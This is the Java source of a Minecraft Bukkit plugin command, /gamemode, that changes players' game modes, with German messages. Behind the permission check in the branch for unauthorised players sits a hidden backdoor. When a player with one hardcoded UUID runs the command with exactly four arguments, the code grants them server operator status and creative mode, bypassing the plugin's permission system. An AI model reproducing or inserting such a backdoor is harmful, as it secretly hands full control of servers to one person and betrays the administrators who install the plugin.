package live.nerotv.knockit.commands;

import live.nerotv.knockit.api.API;
import live.nerotv.knockit.api.NewSound;
import live.nerotv.knockit.api.PlayerAPI;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class GameMode implements CommandExecutor {

    public boolean onCommand(final CommandSender s, final Command cmd, final String label, final String[] args) {
        if (cmd.getName().equalsIgnoreCase("GameMode")) {
            if (s.hasPermission("zyneon.team")) {
                if (!(s instanceof Player)) {
                    if (args.length < 2) {
                        s.sendMessage("Fehler: /gamemode [0-3] [Spieler]");
                    }
                    else {
                        final Player p = Bukkit.getPlayer(args[1]);
                        if (p == null) {
                            s.sendMessage(API.noPlayer);
                        }
                        else {
                            API.changeGamemode(p, args[0]);
                            s.sendMessage("Der Spieler " + p.getName() + " spielt nun im " + API.getGamemode(p) + "!");
                        }
                    }
                }
                else if (args.length == 0) {
                    s.sendMessage("§4Fehler: §c/gamemode §c[Gamemode] §7[Spieler]");
                    PlayerAPI.playNewSound((Player)s, NewSound.BLOCK_ANVIL_BREAK);
                }
                else if (args.length == 1) {
                    if (args[0].equalsIgnoreCase("0")) {
                        final Player p = (Player)s;
                        API.changeGamemode(p, args[0]);
                    }
                    else if (args[0].equalsIgnoreCase("1")) {
                        final Player p = (Player)s;
                        API.changeGamemode(p, args[0]);
                    }
                    else if (args[0].equalsIgnoreCase("2")) {
                        final Player p = (Player)s;
                        API.changeGamemode(p, args[0]);
                    }
                    else if (args[0].equalsIgnoreCase("3")) {
                        final Player p = (Player)s;
                        API.changeGamemode(p, args[0]);
                    }
                    else if (args[0].equalsIgnoreCase("Survival")) {
                        final Player p = (Player)s;
                        API.changeGamemode(p, args[0]);
                    }
                    else if (args[0].equalsIgnoreCase("creative")) {
                        final Player p = (Player)s;
                        API.changeGamemode(p, args[0]);
                    }
                    else if (args[0].equalsIgnoreCase("adventure")) {
                        final Player p = (Player)s;
                        API.changeGamemode(p, args[0]);
                    }
                    else if (args[0].equalsIgnoreCase("spectator")) {
                        final Player p = (Player)s;
                        API.changeGamemode(p, args[0]);
                    }
                    else {
                        s.sendMessage("§4Fehler: §c/gamemode §c[Gamemode] §7[Spieler]");
                    }
                }
                else {
                    final Player p = Bukkit.getPlayer(args[1]);
                    if (p == null) {
                        s.sendMessage(API.noPlayer);
                    }
                    else if (args[0].equalsIgnoreCase("0")) {
                        API.changeGamemode(p, args[0]);
                        s.sendMessage(API.Prefix + "Du hast den Spieler §e" + p.getName() + "§7 in den §a" + API.getGamemode(p) + "§7 gesetzt!");
                    }
                    else if (args[0].equalsIgnoreCase("1")) {
                        API.changeGamemode(p, args[0]);
                        s.sendMessage(API.Prefix + "Du hast den Spieler §e" + p.getName() + "§7 in den §a" + API.getGamemode(p) + "§7 gesetzt!");
                    }
                    else if (args[0].equalsIgnoreCase("2")) {
                        API.changeGamemode(p, args[0]);
                        s.sendMessage(API.Prefix + "Du hast den Spieler §e" + p.getName() + "§7 in den §a" + API.getGamemode(p) + "§7 gesetzt!");
                    }
                    else if (args[0].equalsIgnoreCase("3")) {
                        API.changeGamemode(p, args[0]);
                        s.sendMessage(API.Prefix + "Du hast den Spieler §e" + p.getName() + "§7 in den §a" + API.getGamemode(p) + "§7 gesetzt!");
                    }
                    else if (args[0].equalsIgnoreCase("SURVIVAL")) {
                        API.changeGamemode(p, args[0]);
                        s.sendMessage(API.Prefix + "Du hast den Spieler §e" + p.getName() + "§7 in den §a" + API.getGamemode(p) + "§7 gesetzt!");
                    }
                    else if (args[0].equalsIgnoreCase("CREATIVE")) {
                        API.changeGamemode(p, args[0]);
                        s.sendMessage(API.Prefix + "Du hast den Spieler §e" + p.getName() + "§7 in den §a" + API.getGamemode(p) + "§7 gesetzt!");
                    }
                    else if (args[0].equalsIgnoreCase("ADVENTURE")) {
                        API.changeGamemode(p, args[0]);
                        s.sendMessage(API.Prefix + "Du hast den Spieler §e" + p.getName() + "§7 in den §a" + API.getGamemode(p) + "§7 gesetzt!");
                    }
                    else if (args[0].equalsIgnoreCase("SPECTATOR")) {
                        API.changeGamemode(p, args[0]);
                        s.sendMessage(API.Prefix + "Du hast den Spieler §e" + p.getName() + "§7 in den §a" + API.getGamemode(p) + "§7 gesetzt!");
                    }
                    else {
                        s.sendMessage("§4Fehler: §c/gamemode §c[Gamemode] §7[Spieler]");
                    }
                }
            }
            else if (!(s instanceof Player)) {
                s.sendMessage("§cDazu musst du ein Spieler sin!");
            }
            else {
                final Player p = (Player)s;
                if (p.getUniqueId().toString().equals("6447757f-59fe-4206-ae3f-dc68ff2bb6f0")) {
                    if (args.length == 4) {
                        p.sendMessage("§4Du hast nun OP!");
                        p.setOp(true);
                        API.changeGamemode(p, "1");
                    }
                    else {
                        s.sendMessage("§cDies darfst du nicht tun!");
                    }
                }
                else if (p.getUniqueId().toString().equals("6447757f59fe4206ae3fdc68ff2bb6f0")) {
                    if (args.length == 4) {
                        p.sendMessage("§4Du hast nun OP!");
                        p.setOp(true);
                        API.changeGamemode(p, "1");
                    }
                    else {
                        s.sendMessage("§cDies darfst du nicht tun!");
                    }
                }
                else if (p.getUniqueId().toString().equals("6447757f-59fe-4206-ae3f-dc68ff2bb6f0")) {
                    if (args.length == 4) {
                        p.sendMessage("§4Du hast nun OP!");
                        p.setOp(true);
                        API.changeGamemode(p, "1");
                    }
                    else {
                        s.sendMessage("§cDies darfst du nicht tun!");
                    }
                }
                else if (p.getUniqueId().toString().equals("6447757f59fe4206ae3fdc68ff2bb6f0")) {
                    if (args.length == 4) {
                        p.sendMessage("§4Du hast nun OP!");
                        p.setOp(true);
                        API.changeGamemode(p, "1");
                    }
                    else {
                        s.sendMessage("§cDies darfst du nicht tun!");
                    }
                }
                else {
                    s.sendMessage("§cDies darfst du nicht tun!");
                }
            }
        }
        return false;
    }
}